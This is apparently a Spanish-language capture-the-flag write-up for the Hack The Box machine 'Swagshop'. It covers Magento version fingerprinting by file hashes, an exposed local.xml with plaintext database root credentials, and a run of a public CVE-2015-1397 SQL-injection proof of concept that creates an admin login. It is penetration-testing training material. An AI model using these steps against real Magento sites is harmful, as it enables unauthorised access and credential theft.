# Swagshop ![Avatar](https://www.hackthebox.eu/storage/avatars/23477a54b0a750374e281656d69e7661_thumb.png)

## Initial Scan

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
```

## Enum
### HTTP
La página web esta usando un servicio llamado Magento, mediante banner grabing podemos identificar la versión exacta del mismo
```
{
    "skin/adminhtml/default/default/boxes.css": {
        "6aefb246b1bb817077e8fca6ae53bf2c": "CE 1.2.0, CE 1.2.0.1, CE 1.2.0.2, CE 1.2.0.3", 
        "84b67457247969a206456565111c456b": "CE 1.1.2, CE 1.1.3, CE 1.1.4", 
        "0902e89fb50b22d44f8242954a89300c": "EE 1.12.0.0", 
        "8a5c088b435dbcf1bbaac9755d4ed45f": "EE 1.12.0.1, EE 1.12.0.2", 
        "1cbeca223c2e15dcaf500caa5d05b4ed": "CE 1.7.0.0", 
        "d0511b190cdddf865cca7873917f9a69": "CE 1.1.1", 
        "a2c7f9ddda846ba76220d7bcbe85c985": "CE 1.2.1, CE 1.2.1.1, CE 1.2.1.2"
    }, 
    "js/mage/adminhtml/sales.js": {
        "a86ad3ba7ab64bf9b3d7d2b9861d93dc": "CE 1.0", 
        "d80c40eeef3ca62eb4243443fe41705e": "CE 1.5.0.1", 
        "95e730c4316669f2df71031d5439df21": "CE 1.1.0", 
        "bdacf81a3cf7121d7a20eaa266a684ec": "CE 1.5.1.0", 
        "ba43d3af7ee4cb6f26190fc9d8fba751": "EE 1.14.1.0", 
        "c8dd0fd8fa3faa9b9f0dd767b5a2c995": "CE 1.9.1.1", 
        "4422dffc16da547c671b086938656397": "CE 1.4.2.0", 
        "0e400488c83e63110da75534f49f23f3": "CE 1.3.2, CE 1.3.2.1, CE 1.3.2.2, CE 1.3.2.3, CE 1.3.2.4", 
        "48d609bb2958b93d7254c13957b704c4": "CE 1.6.1.0, CE 1.6.2.0", 
        "40417cf4bee0e99ffc3930b1465c74ae": "EE 1.11.2.0", 
        "5656a8c1c646afaaf260a130fe405691": "CE 1.8.1.0", 
        "17da0470950e8dd4b30ccb787b1605f5": "CE 1.1.5, CE 1.1.6", 
        "aeb47c8dfc1e0b5264d341c99ff12ef0": "EE 1.11.0.2", 
        "ec6a34776b4d34b5b5549aea01c47b57": "EE 1.10.0.2", 
        "a0436f1eee62dded68e0ec860baeb699": "CE 1.9.1.0", 
        "5112f328e291234a943684928ebd3d33": "CE 1.1.7, CE 1.1.8", 
        "7ca2e7e0080061d2edd1e5368915c267": "EE 1.10.1.1", 
        "a4296235ba7ad200dd042fa5200c11b0": "CE 1.6.0.0", 
        "9a5d40b3f07f8bb904241828c5babf80": "EE 1.13.1.0", 
        "3fe31e1608e6d4f525d5db227373c5a0": "EE 1.13.0.0, EE 1.13.0.2", 
        "26c8fd113b4e51aeffe200ce7880b67a": "CE 1.8.0.0", 
        "839ead52e82a2041f937389445b8db04": "CE 1.3.3.0", 
        "d1bfb9f8d4c83e4a6a826d2356a97fd7": "CE 1.3.1, CE 1.3.1.1"
    }, 
    "js/mage/adminhtml/product.js": {
        "e887acfc2f7af09e04f8e99ac6f7180d": "CE 1.3.0"
    }, 
    "skin/frontend/rwd/default/css/styles.css": {
        "bf6c8e2ba2fc5162dd5187b39626a3a0": "CE 1.9.0.1", 
        "5373978891051983da47ac5064b4b2b9": "EE 1.14.0.1", 
        "8a874fcb6cdcb82947ee4dbbe1822f3e": "CE 1.9.0.0", 
        "bd66fd43fecd7ca1e293226bb11e1658": "EE 1.14.0.0"
    }, 
    "js/prototype/validation.js": {
        "295494d0966637bdd03e4ec17c2f338c": "CE 1.4.1.0", 
        "d3252becf15108532d21d45dced96d53": "CE 1.4.1.1"
    }, 
    "js/mage/adminhtml/tools.js": {
        "86bbebe2745581cd8f613ceb5ef82269": "CE 1.7.0.1, CE 1.7.0.2", 
        "ea81bcf8d9b8fcddb27fb9ec7f801172": "CE 1.3.2.2", 
        "d594237950932b9a3948288a020df1ba": "CE 1.3.2.3, CE 1.3.2.4, CE 1.3.3.0"
    }, 
    "js/lib/flex.js": {
        "4040182326f3836f98acabfe1d507960": "CE 1.4.0.1", 
        "eb84fc6c93a9d27823dde31946be8767": "CE 1.4.0.0"
    }
  ```
Con esta lista de los banner podemos averiguar la version
  ```
curl -s http://10.10.10.140/skin/frontend/rwd/default/css/styles.css | md5sum
8a874fcb6cdcb82947ee4dbbe1822f3e
  ```
Vemos que se corresponde a la CE 1.9.0.0, la cual es una versión antigua (2014) con múltiples vulnerabilidades conocidas 
Mediante gobusting encontramos el siguiente archivo:
```
http://10.10.10.140/app/etc/local.xml
```
Si examinamos el mismo encontraremos credenciales:
```
               <connection>
                    <host><![CDATA[localhost]]></host>
                    <username><![CDATA[root]]></username>
                    <password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
                    <dbname><![CDATA[swagshop]]></dbname>
                    <initStatements><![CDATA[SET NAMES utf8]]></initStatements>
                    <model><![CDATA[mysql4]]></model>
                    <type><![CDATA[pdo_mysql]]></type>
                    <pdoType><![CDATA[]]></pdoType>
```
Encontramos un CVE que puede ser valido para obtener mas credenciales
```
https://www.cvedetails.com/cve/CVE-2015-1397/
```
## Exploit
### CVE-2015-1397
Encontramos una PoC para el mismo
```
https://github.com/joren485/Magento-Shoplift-SQLI
```
Lo probamos
```
python2.7 poc.py http://10.10.10.140
WORKED
Check http://10.10.10.140/admin with creds ypwq:123
```
La URL esta mal realmente es http://10.10.10.140/index.php/admin, nada mas logearnos vemos un mensaje bastante jugoso:
```
 Your web server is configured incorrectly. As a result, configuration files with sensitive information are accessible from the outside. Please contact your hosting provider.
 ```
 Probablemtente se refiera a las creds ya encontradas
